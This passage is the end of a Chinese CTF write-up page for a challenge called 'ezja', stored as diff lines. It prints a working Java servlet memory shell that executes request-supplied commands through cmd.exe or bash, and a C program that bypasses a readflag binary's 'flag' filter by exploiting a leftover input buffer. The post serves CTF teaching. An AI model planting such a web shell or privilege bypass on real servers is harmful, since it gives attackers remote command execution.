+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">transform</span><span style="color:#ff79c6">(</span>com<span style="color:#ff79c6">.</span><span style="color:#50fa7b">sun</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">org</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">apache</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">xalan</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">internal</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">xsltc</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">DOM</span> document<span style="color:#ff79c6">,</span> com<span style="color:#ff79c6">.</span><span style="color:#50fa7b">sun</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">org</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">apache</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">xml</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">internal</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">dtm</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">DTMAxisIterator</span> iterator<span style="color:#ff79c6">,</span> SerializationHandler handler<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">throws</span> TransletException <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    @Override
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">init</span><span style="color:#ff79c6">(</span>FilterConfig filterConfig<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">throws</span> ServletException <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    @Override
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">doFilter</span><span style="color:#ff79c6">(</span>ServletRequest servletRequest<span style="color:#ff79c6">,</span> ServletResponse servletResponse<span style="color:#ff79c6">,</span> FilterChain filterChain<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">throws</span> IOException<span style="color:#ff79c6">,</span> ServletException <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>        String string <span style="color:#ff79c6">=</span> servletRequest<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getParameter</span><span style="color:#ff79c6">(</span>param<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">(</span>string <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">null</span><span style="color:#ff79c6">){</span>
+</span></span><span style="display:flex;"><span>            String osName <span style="color:#ff79c6">=</span> System<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getProperty</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;os.name&#34;</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>            String<span style="color:#ff79c6">[]</span> cmd <span style="color:#ff79c6">=</span> osName <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">null</span> <span style="color:#ff79c6">&amp;&amp;</span> osName<span style="color:#ff79c6">.</span><span style="color:#50fa7b">toLowerCase</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">contains</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;win&#34;</span><span style="color:#ff79c6">)</span> <span style="color:#ff79c6">?</span> <span style="color:#ff79c6">new</span> String<span style="color:#ff79c6">[]{</span><span style="color:#f1fa8c">&#34;cmd.exe&#34;</span><span style="color:#ff79c6">,</span><span style="color:#f1fa8c">&#34;/c&#34;</span><span style="color:#ff79c6">,</span>string<span style="color:#ff79c6">}</span> <span style="color:#ff79c6">:</span> <span style="color:#ff79c6">new</span> String<span style="color:#ff79c6">[]{</span><span style="color:#f1fa8c">&#34;/bin/bash&#34;</span><span style="color:#ff79c6">,</span><span style="color:#f1fa8c">&#34;-c&#34;</span><span style="color:#ff79c6">,</span>string<span style="color:#ff79c6">};</span>
+</span></span><span style="display:flex;"><span>            Process exec <span style="color:#ff79c6">=</span> Runtime<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getRuntime</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">exec</span><span style="color:#ff79c6">(</span>cmd<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>            BufferedReader bufferedReader <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> BufferedReader<span style="color:#ff79c6">(</span><span style="color:#ff79c6">new</span> InputStreamReader<span style="color:#ff79c6">(</span>exec<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getInputStream</span><span style="color:#ff79c6">()));</span>
+</span></span><span style="display:flex;"><span>            StringBuffer stringBuffer <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> StringBuffer<span style="color:#ff79c6">();</span>
+</span></span><span style="display:flex;"><span>            String lineData<span style="color:#ff79c6">;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">while</span> <span style="color:#ff79c6">((</span>lineData <span style="color:#ff79c6">=</span> bufferedReader<span style="color:#ff79c6">.</span><span style="color:#50fa7b">readLine</span><span style="color:#ff79c6">())</span> <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">null</span><span style="color:#ff79c6">){</span>
+</span></span><span style="display:flex;"><span>                stringBuffer<span style="color:#ff79c6">.</span><span style="color:#50fa7b">append</span><span style="color:#ff79c6">(</span>lineData <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39;\n&#39;</span><span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span>            servletResponse<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getOutputStream</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">write</span><span style="color:#ff79c6">(</span>stringBuffer<span style="color:#ff79c6">.</span><span style="color:#50fa7b">toString</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">getBytes</span><span style="color:#ff79c6">(</span>StandardCharsets<span style="color:#ff79c6">.</span><span style="color:#50fa7b">UTF_8</span><span style="color:#ff79c6">));</span>
+</span></span><span style="display:flex;"><span>            servletResponse<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getOutputStream</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">flush</span><span style="color:#ff79c6">();</span>
+</span></span><span style="display:flex;"><span>            servletResponse<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getOutputStream</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">close</span><span style="color:#ff79c6">();</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span>        filterChain<span style="color:#ff79c6">.</span><span style="color:#50fa7b">doFilter</span><span style="color:#ff79c6">(</span>servletRequest<span style="color:#ff79c6">,</span>servletResponse<span style="color:#ff79c6">);</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    @Override
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">destroy</span><span style="color:#ff79c6">()</span> <span style="color:#ff79c6">{</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">}</span>
+</span></span></code></pre></div><p>种上内存马后，发现根目录下flag需要root权限，但是提供了一个readflag。这里预期解是base64 dump程序进行逆向，然后会发现是个pwn</p>
+<p>关键函数在这里，允许任意读取文件，但是过滤了flag字符串</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#8be9fd">bool</span> <span style="color:#ff79c6">__cdecl</span> <span style="color:#50fa7b">checkfunc</span>(<span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>n)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">!</span>strstr(n, <span style="color:#f1fa8c">&#34;flag&#34;</span>) <span style="color:#ff79c6">&amp;&amp;</span> strstr(n, <span style="color:#f1fa8c">&#34;..&#34;</span>) <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0LL</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>注意到这里允许无限次输入文件名称，同时存储字符串的的变量没有清空，也就是说上一次输入的字符会残留在其中。同时读入函数不会存储回车符号。</p>
+<p>写一个c语言程序用于交互</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#6272a4">// gcc -o exp exp.c
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdio.h&gt;</span><span style="color:#ff79c6">
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdlib.h&gt;</span><span style="color:#ff79c6">
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;string.h&gt;</span><span style="color:#ff79c6">
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;errno.h&gt;</span><span style="color:#ff79c6">
+</span></span></span><span style="display:flex;"><span><span style="color:#ff79c6"></span><span style="color:#8be9fd">char</span> buf[<span style="color:#bd93f9">0x1000</span>];
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd">char</span> expstr[<span style="color:#bd93f9">0x50</span>];
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">static</span> <span style="color:#8be9fd">int</span> <span style="color:#50fa7b">start_subprocess</span>(<span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>command[], <span style="color:#8be9fd">int</span> <span style="color:#ff79c6">*</span>pid, <span style="color:#8be9fd">int</span> <span style="color:#ff79c6">*</span>infd, <span style="color:#8be9fd">int</span> <span style="color:#ff79c6">*</span>outfd){
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">int</span> p1[<span style="color:#bd93f9">2</span>], p2[<span style="color:#bd93f9">2</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>pid <span style="color:#ff79c6">||</span> <span style="color:#ff79c6">!</span>infd <span style="color:#ff79c6">||</span> <span style="color:#ff79c6">!</span>outfd)
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> (pipe(p1) <span style="color:#ff79c6">==</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> (pipe(p2) <span style="color:#ff79c6">==</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>){
+</span></span><span style="display:flex;"><span>        close(p1[<span style="color:#bd93f9">1</span>]);
+</span></span><span style="display:flex;"><span>        close(p1[<span style="color:#bd93f9">0</span>]);
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> ((<span style="color:#ff79c6">*</span>pid <span style="color:#ff79c6">=</span> fork()) <span style="color:#ff79c6">==</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>){
+</span></span><span style="display:flex;"><span>        close(p2[<span style="color:#bd93f9">1</span>]);
+</span></span><span style="display:flex;"><span>        close(p2[<span style="color:#bd93f9">0</span>]);
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">*</span>pid)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">*</span>infd <span style="color:#ff79c6">=</span> p1[<span style="color:#bd93f9">1</span>];
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">*</span>outfd <span style="color:#ff79c6">=</span> p2[<span style="color:#bd93f9">0</span>];
+</span></span><span style="display:flex;"><span>        close(p1[<span style="color:#bd93f9">0</span>]);
+</span></span><span style="display:flex;"><span>        close(p2[<span style="color:#bd93f9">1</span>]);
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">1</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">else</span>
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        dup2(p1[<span style="color:#bd93f9">0</span>], <span style="color:#bd93f9">0</span>);
+</span></span><span style="display:flex;"><span>        dup2(p2[<span style="color:#bd93f9">1</span>], <span style="color:#bd93f9">1</span>);
+</span></span><span style="display:flex;"><span>        close(p1[<span style="color:#bd93f9">0</span>]);
+</span></span><span style="display:flex;"><span>        close(p1[<span style="color:#bd93f9">1</span>]);
+</span></span><span style="display:flex;"><span>        close(p2[<span style="color:#bd93f9">0</span>]);
+</span></span><span style="display:flex;"><span>        close(p2[<span style="color:#bd93f9">1</span>]);
+</span></span><span style="display:flex;"><span>        execvp(<span style="color:#ff79c6">*</span>command, command);
+</span></span><span style="display:flex;"><span>        <span style="color:#6272a4">/* Error occured. */</span>
+</span></span><span style="display:flex;"><span>        fprintf(stderr, <span style="color:#f1fa8c">&#34;error running %s: %s&#34;</span>, <span style="color:#ff79c6">*</span>command, strerror(errno));
+</span></span><span style="display:flex;"><span>        abort();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd">void</span> <span style="color:#50fa7b">solve</span>(<span style="color:#8be9fd">char</span><span style="color:#ff79c6">*</span> buf){
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">int</span> pid, infd, outfd;
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>cmd[<span style="color:#bd93f9">2</span>];
+</span></span><span style="display:flex;"><span>    cmd[<span style="color:#bd93f9">0</span>] <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;./readflag&#34;</span>;
+</span></span><span style="display:flex;"><span>    cmd[<span style="color:#bd93f9">1</span>] <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
+</span></span><span style="display:flex;"><span>    start_subprocess(cmd, <span style="color:#ff79c6">&amp;</span>pid, <span style="color:#ff79c6">&amp;</span>outfd, <span style="color:#ff79c6">&amp;</span>infd);
+</span></span><span style="display:flex;"><span>    memset(buf,<span style="color:#bd93f9">0</span>,<span style="color:#ff79c6">sizeof</span>(buf));
+</span></span><span style="display:flex;"><span>    memset(expstr,<span style="color:#bd93f9">0</span>,<span style="color:#ff79c6">sizeof</span>(expstr));
+</span></span><span style="display:flex;"><span>    read(infd, buf, strlen(<span style="color:#f1fa8c">&#34;Input the file U want to read: &#34;</span>));
+</span></span><span style="display:flex;"><span>    printf(<span style="color:#f1fa8c">&#34;%s</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, buf);
+</span></span><span style="display:flex;"><span>    sprintf(expstr, <span style="color:#f1fa8c">&#34;%s&#34;</span>, <span style="color:#f1fa8c">&#34;aaaag</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
+</span></span><span style="display:flex;"><span>    write(outfd, expstr, strlen(expstr));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    memset(expstr,<span style="color:#bd93f9">0</span>,<span style="color:#ff79c6">sizeof</span>(expstr));
+</span></span><span style="display:flex;"><span>    memset(buf,<span style="color:#bd93f9">0</span>,<span style="color:#ff79c6">sizeof</span>(buf));
+</span></span><span style="display:flex;"><span>    read(infd, buf, strlen(<span style="color:#f1fa8c">&#34;Not that file</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">Input the file U want to read: &#34;</span>));
+</span></span><span style="display:flex;"><span>    printf(<span style="color:#f1fa8c">&#34;%s</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, buf);
+</span></span><span style="display:flex;"><span>    sprintf(expstr, <span style="color:#f1fa8c">&#34;%s&#34;</span>, <span style="color:#f1fa8c">&#34;/fla</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
+</span></span><span style="display:flex;"><span>    write(outfd, expstr, strlen(expstr));
+</span></span><span style="display:flex;"><span>    read(infd, buf, strlen(<span style="color:#f1fa8c">&#34;Input the file U want to read: &#34;</span>));
+</span></span><span style="display:flex;"><span>    printf(<span style="color:#f1fa8c">&#34;%s</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, buf);
+</span></span><span style="display:flex;"><span>    memset(buf,<span style="color:#bd93f9">0</span>,<span style="color:#ff79c6">sizeof</span>(buf));
+</span></span><span style="display:flex;"><span>    read(infd, buf, <span style="color:#bd93f9">1000</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#8be9fd">int</span> <span style="color:#50fa7b">main</span>(){
+</span></span><span style="display:flex;"><span>    solve(buf);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>但是但是，我当时直接bash管道符把flag输入进去就出了</p>
+<p><img src="https://md.byr.moe/uploads/upload_e09e564180ebbd87b8b3abe28ea18c0e.png" alt=""></p>
+<p>emm估计是循环导致的bug?</p>
+<p><img src="https://md.byr.moe/uploads/upload_7f817e878b6a3a1ccd18d4b2049dfd3c.jpg" alt=""></p>
+<p>Anyway，现阶段这道题涉及的知识点可能对同学们来说有点多，希望这篇wp可以起到一个激发大家求知欲的作用。</p>
+
+        </p>
+    </div>
+</div>
+
+<aside class="post-toc">
+    <nav id="toc">
+        <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#词超人">词超人</a></li>
+            <li><a href="#你的名字">你的名字</a></li>
+            <li><a href="#ezja">ezja</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </nav>
+</aside>
+
+
+
+    
+
+        </main><footer class="footer">
+    <span>&copy; 2022 </span>
+    <span>
+        Made with &#10084;&#65039; using <a target="_blank" href="https://github.com/526avijitgupta/gokarna">Gokarna</a>
+    </span>
+</footer>
+</body>
+</html>
